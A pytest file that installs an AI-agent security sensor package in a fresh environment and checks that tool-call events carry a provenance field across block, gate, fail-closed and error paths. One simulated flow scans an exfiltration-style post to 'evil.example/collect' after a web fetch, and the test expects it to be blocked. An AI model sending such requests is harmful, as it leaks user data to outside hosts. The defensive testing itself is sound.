"""M9 from OUTSIDE the process: the built wheel, a fresh venv, ``python -I``.
The installed sensor puts ``valueOrigin`` on a tool-call event, never on an input
event, never in OFF, and withholds a value the consumer does not accept under
the default vocabulary ("v1"), emitting it under "v2"."""
from __future__ import annotations

import json
import subprocess

import pytest

from .harness import ROOT, build_wheel, fresh_venv

pytestmark = pytest.mark.requires_dev_extra

CODE = r'''
import json, warnings
from concurrent.futures import ThreadPoolExecutor
import xaidr
from xaidr import provenance_chain as pc
from xaidr.schema import SCHEMA_VERSION, to_openA2A
class Null:
    def report(self, *a, **k):
        pass
def sensor(**kw):
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        s = xaidr.Sensor(agent_id="m9-wheel", reporter=Null(), enforcement_mode="block", **kw)
    events = []
    real = s._telemetry.enqueue
    s._telemetry.enqueue = lambda ev: (events.append(ev), real(ev))[1]
    return s, events
def tool(events):
    return [e["data"] for e in events if e.get("data", {}).get("direction") == "tool_call"]
out = {"xaidr_file": xaidr.__file__, "schema_version": SCHEMA_VERSION}
s, ev = sensor(value_origin="record")
s.scan("Summarise the report.", direction="input")
out["input_has_key"] = any("valueOrigin" in e.get("data", {}) for e in ev)
s.scan_tool_call("run_command", {"command": "ls"})
out["main"] = [d.get("valueOrigin", "<absent>") for d in tool(ev)]
out["mapped"] = to_openA2A({"type": "scan", "agentId": "a", "data": tool(ev)[0]}).get("gen_ai.security.value_origin")
s, ev = sensor(value_origin="off")
s.scan_tool_call("run_command", {"command": "ls"})
out["off"] = [d.get("valueOrigin", "<absent>") for d in tool(ev)]
def unread(vocab):
    s, ev = sensor(value_origin="enforce", value_origin_wire=vocab)
    stand_in = type("Response", (), {"__module__": "httpx"})()
    def run():
        pc.begin_flow(principal="alice")
        try:
            s.scan("Summarise the report.", direction="input")
            s._scan_tool_result("fetched", tool="web_fetch", arguments={}, raw_result=stand_in)
            ev.clear()
            r = s.scan_tool_call("http_post", {"url": "https://evil.example/collect"})
            return [r.action, r.value_origin.wire.value, [d.get("valueOrigin", "<absent>") for d in tool(ev)]]
        finally:
            pc.clear_flow()
    with ThreadPoolExecutor(max_workers=1) as pool:
        return pool.submit(run).result()
out["unread_v1"] = unread("v1")
out["unread_v2"] = unread("v2")
# The six tool-call exits from the installed wheel (milestone review: in-process only).
import xaidr.sensor as sensor_module
from xaidr import CircuitBreaker, ScanResult, SensorExtension
class Gate(SensorExtension):
    name = "m9-wheel-gate"
    def gate(self, req):
        if req.direction == "tool_call":
            return ScanResult(action="blocked", score=1.0, category="m9_gate", rules=["M9_GATE"])
        return None
paths = {}
s, ev = sensor(value_origin="record", circuit_breaker=CircuitBreaker(rate_threshold=1, cooldown_sec=None))
s.scan_tool_call("warm_up", {"command": "ls"}); ev.clear()
paths["circuit"] = (repr(s.scan_tool_call("run_command", {"command": "ls"})), tool(ev))
s, ev = sensor(value_origin="record", extensions=[Gate()])
paths["gate"] = (repr(s.scan_tool_call("run_command", {"command": "ls"})), tool(ev))
s, ev = sensor(value_origin="record", fail_closed=("bounds",), value_origin_wire="v2")
paths["fail_closed"] = (repr(s.scan_tool_call("run_command", {f"k{n}": "v" for n in range(80)})), tool(ev))
s, ev = sensor(value_origin="record")
real = sensor_module.classify
def boom(*a, **k):
    raise RuntimeError("m9 wheel classify fault")
sensor_module.classify = boom
try:
    paths["scan_error"] = (repr(s.scan_tool_call("run_command", {"command": "ls"})), tool(ev))
finally:
    sensor_module.classify = real
s, ev = sensor(value_origin="record")
paths["not_scannable"] = (repr(s.scan_tool_call(12345, {"command": "ls"})), tool(ev))
s, ev = sensor(value_origin="record")
paths["main"] = (repr(s.scan_tool_call("run_command", {"command": "ls -la /tmp"})), tool(ev))
out["paths"] = {k: [r + " " + repr(t), [d.get("valueOrigin", "<absent>") for d in t]] for k, (r, t) in paths.items()}
print(json.dumps(out))
'''

MARKERS = {"circuit": "CIRCUIT_BREAKER_OPEN", "gate": "M9_GATE", "fail_closed": "FAIL_CLOSED",
           "scan_error": "SCAN_FAILED_OPEN", "not_scannable": "NOT_SCANNABLE", "main": ""}


@pytest.mark.parametrize("path", sorted(MARKERS))
def test_the_installed_wheel_carries_value_origin_on_each_tool_call_exit(installed, path):
    seen, values = installed["paths"][path]
    assert MARKERS[path] in seen, f"{path}: the exit's own marker is missing: {seen[:300]}"
    # An input was scanned earlier in this driver's thread (S-2 binds a ledger),
    # so each exit reads no_destination (silent-failure review: this said no_flow).
    # fail_closed: 80 argument leaves read argument_bound, which v1 WITHHOLDS (not
    # one of the Brain's nine), so that sensor runs v2 to show the field arrives.
    want = "argument_bound" if path == "fail_closed" else "no_destination"
    assert values and all(v == want for v in values), (
        f"{path}: a tool-call event from the installed wheel without valueOrigin: {values}")


@pytest.fixture(scope="module")
def installed(tmp_path_factory):
    try:
        import hatchling  # noqa: F401
    except ImportError:
        pytest.fail("REFUSING: hatchling (dev extra) is not installed, so no wheel can "
                    "be built. pip install '.[dev]'.", pytrace=False)
    work = tmp_path_factory.mktemp("m9")
    venv = fresh_venv(work / "venv", build_wheel(ROOT, work / "dist"))
    py = venv / "bin" / "python" if venv.is_dir() else venv
    r = subprocess.run([str(py), "-I", "-c", CODE], capture_output=True, text=True, cwd=work)
    assert r.returncode == 0, r.stderr[-3000:]
    out = json.loads(r.stdout.strip().splitlines()[-1])
    assert "site-packages" in out["xaidr_file"], out["xaidr_file"]
    return out


def test_the_installed_wheel_emits_value_origin_on_tool_calls_only(installed):
    # The driver scans an input first, which binds a ledger (S-2), so the call
    # reads no_destination ("ls" names none), one of the nine v1 values.
    assert installed["main"] and all(v == "no_destination" for v in installed["main"]), installed["main"]
    assert installed["input_has_key"] is False
    assert installed["off"] and all(v == "<absent>" for v in installed["off"]), installed["off"]
    assert installed["mapped"] == "no_destination" and installed["schema_version"] == "0.3.0", installed


def test_the_installed_wheel_withholds_what_the_consumer_rejects(installed):
    action, wire, emitted = installed["unread_v1"]
    assert (action, wire) == ("blocked", "result_unread"), installed["unread_v1"]
    assert emitted and all(v == "<absent>" for v in emitted), (
        f"v1 sent a value the Brain rejects: {emitted}")
    assert installed["unread_v2"][2] and all(v == "result_unread" for v in installed["unread_v2"][2]), (
        installed["unread_v2"])
